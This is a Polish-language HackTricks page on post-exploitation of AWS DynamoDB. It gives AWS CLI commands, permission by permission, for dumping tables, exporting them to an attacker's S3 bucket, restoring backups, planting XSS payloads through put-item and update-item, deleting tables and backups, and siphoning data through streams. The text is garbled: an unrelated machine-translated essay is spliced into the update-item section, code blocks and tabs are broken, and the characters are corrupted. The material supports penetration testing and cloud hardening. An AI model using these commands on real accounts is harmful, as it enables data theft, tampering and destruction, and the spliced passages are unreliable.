# AWS - Eksploatacja po ataku na DynamoDB

<details>

<summary><strong>Dowiedz si, jak hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## DynamoDB

Aby uzyska wicej informacji, sprawd藕:

{% content-ref url="../aws-services/aws-databases/aws-dynamodb-enum.md" %}
[aws-dynamodb-enum.md](../aws-services/aws-databases/aws-dynamodb-enum.md)
{% endcontent-ref %}

### `dynamodb:BatchGetItem`

Atakujcy posiadajcy te uprawnienia bdzie w stanie **pobra elementy z tabel na podstawie klucza g贸wnego** (nie mo偶na po prostu poprosi o wszystkie dane z tabeli). Oznacza to, 偶e musisz zna klucze g贸wne (mo偶esz je uzyska, pobierajc metadane tabeli (`describe-table`).

{% tabs %}
{% tab title="plik json" %}
{% code overflow="wrap" %}
```bash
aws dynamodb batch-get-item --request-items file:///tmp/a.json

// With a.json
{
"ProductCatalog" : { // This is the table name
"Keys": [
{
"Id" : { // Primary keys name
"N": "205" // Value to search for, you could put here entries from 1 to 1000 to dump all those
}
}
]
}
}
```
{% endcode %}
{% endtab %}

{% tab title="inline" %}
{% code overflow="wrap" %}
```bash
aws dynamodb batch-get-item \
--request-items '{"TargetTable": {"Keys": [{"Id": {"S": "item1"}}, {"Id": {"S": "item2"}}]}}' \
--region <region>
```
{% endcode %}
{% endtab %}
{% endtabs %}



**Potencjalne skutki:** Porednie podniesienie uprawnie poprzez zlokalizowanie poufnych informacji w tabeli

### `dynamodb:GetItem`

**Podobnie jak poprzednie uprawnienia**, to pozwala potencjalnemu atakujcemu na odczytanie wartoci z jednej tabeli, podajc klucz g贸wny wpisu do pobrania:

{% code overflow="wrap" %}
```json
aws dynamodb get-item --table-name ProductCatalog --key  file:///tmp/a.json

// With a.json
{
"Id" : {
"N": "205"
}
}
```
{% endcode %}

Z tym uprawnieniem mo偶liwe jest r贸wnie偶 u偶ycie metody **`transact-get-items`** w ten spos贸b:
```json
aws dynamodb transact-get-items \
--transact-items file:///tmp/a.json

// With a.json
[
{
"Get": {
"Key": {
"Id": {"N": "205"}
},
"TableName": "ProductCatalog"
}
}
]
```
**Potencjalne skutki:** Porednie podniesienie uprawnie poprzez zlokalizowanie wra偶liwych informacji w tabeli

### `dynamodb:Query`

**Podobnie jak poprzednie uprawnienia**, to pozwala potencjalnemu atakujcemu odczytywa wartoci z jednej tabeli, podajc klucz g贸wny wpisu do pobrania. Pozwala u偶ywa [podzbioru por贸wna](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API\_Condition.html), ale jedynym dozwolonym por贸wnaniem z kluczem g贸wnym (kt贸ry musi si pojawi) jest "EQ", wic nie mo偶na u偶y por贸wnania, aby otrzyma ca baz danych w jednym 偶daniu.

{% tabs %}
{% tab title="plik json" %}
{% code overflow="wrap" %}
```bash
aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/a.json

// With a.json
{
"Id" : {
"ComparisonOperator":"EQ",
"AttributeValueList": [ {"N": "205"} ]
}
}
```
{% endcode %}
{% endtab %}

{% tab title="inline" %}
```bash
aws dynamodb query \
--table-name TargetTable \
--key-condition-expression "AttributeName = :value" \
--expression-attribute-values '{":value":{"S":"TargetValue"}}' \
--region <region>
```
{% endtab %}
{% endtabs %}

**Potencjalne skutki:** Porednie podniesienie uprawnie poprzez zlokalizowanie wra偶liwych informacji w tabeli

### `dynamodb:Scan`

Mo偶esz u偶y tej uprawnienia do **atwego wydobywania caej tabeli**.
```bash
aws dynamodb scan --table-name <t_name> #Get data inside the table
```
**Potencjalne skutki:** Porednie podniesienie uprawnie poprzez zlokalizowanie wra偶liwych informacji w tabeli

### `dynamodb:PartiQLSelect`

Mo偶esz u偶y tego uprawnienia do **atwego wydrukowania caej tabeli**.
```bash
aws dynamodb execute-statement \
--statement "SELECT * FROM ProductCatalog"
```
To uprawnienie umo偶liwia r贸wnie偶 wykonanie `batch-execute-statement`, na przykad:
```bash
aws dynamodb batch-execute-statement \
--statements '[{"Statement": "SELECT * FROM ProductCatalog WHERE Id = 204"}]'
```
ale musisz okreli klucz g贸wny z wartoci, wic nie jest to takie przydatne.

**Potencjalne skutki:** Porednie podniesienie uprawnie poprzez zlokalizowanie wra偶liwych informacji w tabeli

### `dynamodb:ExportTableToPointInTime|(dynamodb:UpdateContinuousBackups)`

To uprawnienie umo偶liwi atakujcemu **eksport caej tabeli do wybranego przez niego wiadra S3**:
```bash
aws dynamodb export-table-to-point-in-time \
--table-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable \
--s3-bucket <attacker_s3_bucket> \
--s3-prefix <optional_prefix> \
--export-time <point_in_time> \
--region <region>
```
Nale偶y zauwa偶y, 偶e aby to dziaao, tabela musi mie wczon funkcj przywracania punktu w czasie. Mo偶esz sprawdzi, czy tabela j posiada, u偶ywajc:
```bash
aws dynamodb describe-continuous-backups \
--table-name <tablename>
```
Jeli nie jest wczone, bdziesz musia je **wczy**, a do tego potrzebujesz uprawnienia **`dynamodb:ExportTableToPointInTime`**:
```bash
aws dynamodb update-continuous-backups \
--table-name <value> \
--point-in-time-recovery-specification PointInTimeRecoveryEnabled=true
```
**Potencjalne zagro偶enie:** Porednie podniesienie uprawnie poprzez zlokalizowanie wra偶liwych informacji w tabeli

### `dynamodb:CreateTable`, `dynamodb:RestoreTableFromBackup`, (`dynamodb:CreateBackup)`

Z tymi uprawnieniami, atakujcy bdzie m贸g **utworzy now tabel z kopii zapasowej** (lub nawet utworzy kopi zapasow, aby nastpnie przywr贸ci j w innej tabeli). Nastpnie, posiadajc odpowiednie uprawnienia, bdzie m贸g sprawdzi **informacje** z kopii zapasowych, kt贸re **nie musz ju偶 znajdowa si w tabeli produkcyjnej**.
```bash
aws dynamodb restore-table-from-backup \
--backup-arn <source-backup-arn> \
--target-table-name <new-table-name> \
--region <region>
```
**Potencjalne skutki:** Porednie podniesienie uprawnie poprzez zlokalizowanie wra偶liwych informacji w kopii zapasowej tabeli

### `dynamodb:PutItem`

To uprawnienie umo偶liwia u偶ytkownikom dodawanie **nowego elementu do tabeli lub zastpowanie istniejcego elementu** nowym elementem. Jeli element o tym samym kluczu g贸wnym ju偶 istnieje, **cay element zostanie zastpiony** nowym elementem. Jeli klucz g贸wny nie istnieje, zostanie **utworzony** nowy element o okrelonym kluczu g贸wnym.

{% tabs %}
{% tab title="Przykad XSS" %}
{% code overflow="wrap" %}
```bash
## Create new item with XSS payload
aws dynamodb put-item --table <table_name> --item file://add.json
### With add.json:
{
"Id": {
"S": "1000"
},
"Name": {
"S":  "Marc"
},
"Description": {
"S": "<script>alert(1)</script>"
}
}
```
{% endcode %}
{% endtab %}

{% tab title="Przykad AI" %}
```bash
aws dynamodb put-item \
--table-name ExampleTable \
--item '{"Id": {"S": "1"}, "Attribute1": {"S": "Value1"}, "Attribute2": {"S": "Value2"}}' \
--region <region>
```
{% endtab %}
{% endtabs %}

**Potencjalne skutki:** Wykorzystanie dalszych podatnoci/omijanie zabezpiecze poprzez mo偶liwo dodawania/modyfikowania danych w tabeli DynamoDB

### `dynamodb:UpdateItem`

To uprawnienie umo偶liwia u偶ytkownikom **modyfikowanie istniejcych atrybut贸w elementu lub dodawanie nowych atrybut贸w do elementu**. Nie **zastpuje** caego elementu; aktualizuje tylko okrelone atrybuty. Jeli klucz g贸wny nie istnieje w tabeli, operacja ta **utworzy nowy element** o okrelonym kluczu g贸wnym i ustawia atrybuty okrelone w wyra偶eniu aktualizacji.
```bash
## Update item with XSS payload
aws dynamodb update-item --table <table_name> \
--key file://key.json --update-expression "SET Description = :value" \
--expression-attribute-values file://val.json
### With key.json:
{
"Id": {
"S": "1000"
}
}
### and val.json
{
":value": {
"S": "<script>alert(1)</script>"
}
}
```
{% endcode %}
{% endtab %}

{% tab title="Polish" %}

# AWS DynamoDB - Post-Exploitation

## Wprowadzenie

Po uzyskaniu dostpu do konta AWS i odkryciu, 偶e DynamoDB jest u偶ywane, mo偶emy przeprowadzi r贸偶ne operacje post-exploitation.

## Przegld tabel

Aby zobaczy dostpne tabele w DynamoDB, mo偶emy u偶y polecenia `list-tables` w AWS CLI lub wywoa odpowiednie API.

```bash
aws dynamodb list-tables --region <region> --profile <profile>
```

## Pobieranie danych

Aby pobra dane z tabeli DynamoDB, mo偶emy u偶y polecenia `scan` lub `query` w AWS CLI lub wywoa odpowiednie API.

```bash
aws dynamodb scan --table-name <table_name> --region <region> --profile <profile>
aws dynamodb query --table-name <table_name> --region <region> --profile <profile> --key-condition-expression <expression>
```

## Modyfikowanie danych

Aby modyfikowa dane w tabeli DynamoDB, mo偶emy u偶y polecenia `put-item` w AWS CLI lub wywoa odpowiednie API.

```bash
aws dynamodb put-item --table-name <table_name> --region <region> --profile <profile> --item <item_json>
```

## Usuwanie danych

Aby usun dane z tabeli DynamoDB, mo偶emy u偶y polecenia `delete-item` w AWS CLI lub wywoa odpowiednie API.

```bash
aws dynamodb delete-item --table-name <table_name> --region <region> --profile <profile> --key <key_json>
```

## Tworzenie tabeli

Aby utworzy now tabel w DynamoDB, mo偶emy u偶y polecenia `create-table` w AWS CLI lub wywoa odpowiednie API.

```bash
aws dynamodb create-table --table-name <table_name> --region <region> --profile <profile> --attribute-definitions <attribute_definitions_json> --key-schema <key_schema_json> --provisioned-throughput <provisioned_throughput_json>
```

## Usuwanie tabeli

Aby usun tabel z DynamoDB, mo偶emy u偶y polecenia `delete-table` w AWS CLI lub wywoa odpowiednie API.

```bash
aws dynamodb delete-table --table-name <table_name> --region <region> --profile <profile>
```

## Podsumowanie

Po uzyskaniu dostpu do konta AWS i odkryciu, 偶e DynamoDB jest u偶ywane, mo偶emy przeprowadza r贸偶ne operacje post-exploitation, takie jak przegldanie tabel, pobieranie, modyfikowanie i usuwanie danych, a tak偶e tworzenie i usuwanie tabel.
```bash
aws dynamodb update-item \
--table-name ExampleTable \
--key '{"Id": {"S": "1"}}' \
--update-expression "SET Attribute1 = :val1, Attribute2 = :val2" \
--expression-attribute-values '{":val1": {"S": "NewValue1"}, ":val2": {"S": "NewValue2"}}' \
--region <region>
```
{% endtab %}
{% endtabs %}

**Potencjalne skutki:** Wykorzystanie dalszych podatnoci/obej poprzez mo偶liwo dodawania/modyfikowania danych w tabeli DynamoDB

### `dynamodb:DeleteTable`

Atakujcy posiadajcy to uprawnienie mo偶e **usun tabel DynamoDB, powodujc utrat danych**.
```bash
aws dynamodb delete-table \
--table-name TargetTable \
--region <region>
```
**Potencjalne skutki**: Utrata danych i zak贸cenie usug zale偶nych od usunitej tabeli.

### `dynamodb:DeleteBackup`

Atakujcy posiadajcy to uprawnienie mo偶e **usun kopi zapasow DynamoDB, co potencjalnie mo偶e spowodowa utrat danych w przypadku scenariusza odzyskiwania po awarii**.
```bash
aws dynamodb delete-backup \
--backup-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable/backup/BACKUP_ID \
--region <region>
```
**Potencjalne skutki**: Utrata danych i niemo偶no odzyskania ich z kopii zapasowej w przypadku awarii i koniecznoci przywr贸cenia systemu.

### `dynamodb:StreamSpecification`, `dynamodb:UpdateTable`, `dynamodb:DescribeStream`, `dynamodb:GetShardIterator`, `dynamodb:GetRecords`

{% hint style="info" %}
TODO: Sprawd藕, czy to naprawd dziaa
{% endhint %}

Atakujcy posiadajcy te uprawnienia mo偶e **wczy strumie na tabeli DynamoDB, zaktualizowa tabel, aby rozpocz strumieniowanie zmian, a nastpnie uzyska dostp do strumienia, aby monitorowa zmiany w tabeli w czasie rzeczywistym**. Pozwala to atakujcemu na monitorowanie i wyciek danych, co potencjalnie prowadzi do utraty poufnoci danych.

1. Wcz strumie na tabeli DynamoDB:
```bash
bashCopy codeaws dynamodb update-table \
--table-name TargetTable \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES \
--region <region>
```
2. Opis strumienia do uzyskania ARN i innych szczeg贸贸w:

Aby uzyska ARN i inne szczeg贸y strumienia, wykonaj nastpujce kroki:

1. Otw贸rz konsol AWS i przejd藕 do usugi DynamoDB.
2. Wybierz odpowiedni tabel, kt贸ra jest powizana ze strumieniem.
3. W panelu nawigacyjnym po lewej stronie wybierz opcj "Strumienie".
4. Wybierz strumie, z kt贸rego chcesz uzyska ARN i inne szczeg贸y.
5. W sekcji "Szczeg贸y strumienia" znajdziesz ARN, kt贸ry jest unikalnym identyfikatorem strumienia.
6. Mo偶esz r贸wnie偶 znale藕 inne szczeg贸y, takie jak typ strumienia, stan, rozmiar strumienia itp.

Pamitaj, 偶e ARN jest wa偶nym elementem, kt贸ry jest u偶ywany do identyfikacji i zarzdzania strumieniami w usudze DynamoDB.
```bash
bashCopy codeaws dynamodb describe-stream \
--table-name TargetTable \
--region <region>
```
3. Uzyskaj iterator fragmentu za pomoc ARN strumienia:
```bash
bashCopy codeaws dynamodbstreams get-shard-iterator \
--stream-arn <stream_arn> \
--shard-id <shard_id> \
--shard-iterator-type LATEST \
--region <region>
```
4. U偶yj iteratora shard, aby uzyska dostp i wydosta dane ze strumienia:
```bash
bashCopy codeaws dynamodbstreams get-records \
--shard-iterator <shard_iterator> \
--region <region>
```
**Potencjalne skutki**: Monitorowanie w czasie rzeczywistym i wyciek danych z tabeli DynamoDB.

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy **reklam swojej firmy w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
